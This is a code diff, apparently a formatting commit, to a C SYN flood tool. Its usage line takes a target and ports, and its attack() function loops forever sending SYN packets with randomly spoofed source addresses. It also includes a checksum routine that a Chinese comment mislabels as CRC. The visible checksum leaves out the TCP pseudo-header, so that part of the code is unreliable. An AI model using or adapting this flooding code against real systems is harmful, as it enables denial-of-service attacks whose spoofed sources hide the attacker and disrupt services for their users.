@@ -23,7 +23,7 @@ int main(int argc,char** argv){
 
 	const int on = 1;
 	unsigned short srcport;
-	
+
 	if(argc != 4){
 		printf("Usage: %s target dstpost srcport\n",argv[0]);
 		exit(1);
@@ -85,7 +85,7 @@ void attack(int fkfd, struct sockaddr_in *target,unsigned short srcport)
 	tcp->doff = 5;
 	tcp->syn = 1;
 	tcp->check = 0;
-	
+
 	while(1){
 		ip->ip_src.s_addr = random();
 		tcp->check = check_sum((unsigned short *) tcp,sizeof(struct tcphdr));
@@ -94,24 +94,24 @@ void attack(int fkfd, struct sockaddr_in *target,unsigned short srcport)
 }
 //关于CRC校验和的计算，网上一大堆，我就“拿来主义”了
 unsigned short check_sum(unsigned short *addr,int len){
-        register int nleft=len;
-        register int sum=0;
-        register short *w=addr;
-        short answer=0;
+	register int nleft=len;
+	register int sum=0;
+	unsigned short *w=addr;
+	short answer=0;
 
-        while(nleft>1)
-        {
-                sum+=*w++;
-                nleft-=2;
-        }
-        if(nleft==1)
-        {
-                *(unsigned char *)(&answer)=*(unsigned char *)w;
-                sum+=answer;
-        }
+	while(nleft>1)
+	{
+		sum+=*w++;
+		nleft-=2;
+	}
+	if(nleft==1)
+	{
+		*(unsigned char *)(&answer)=*(unsigned char *)w;
+		sum+=answer;
+	}
 
-        sum=(sum>>16)+(sum&0xffff);
-        sum+=(sum>>16);
-        answer=~sum;
-        return(answer);
+	sum=(sum>>16)+(sum&0xffff);
+	sum+=(sum>>16);
+	answer=~sum;
+	return(answer);
 }
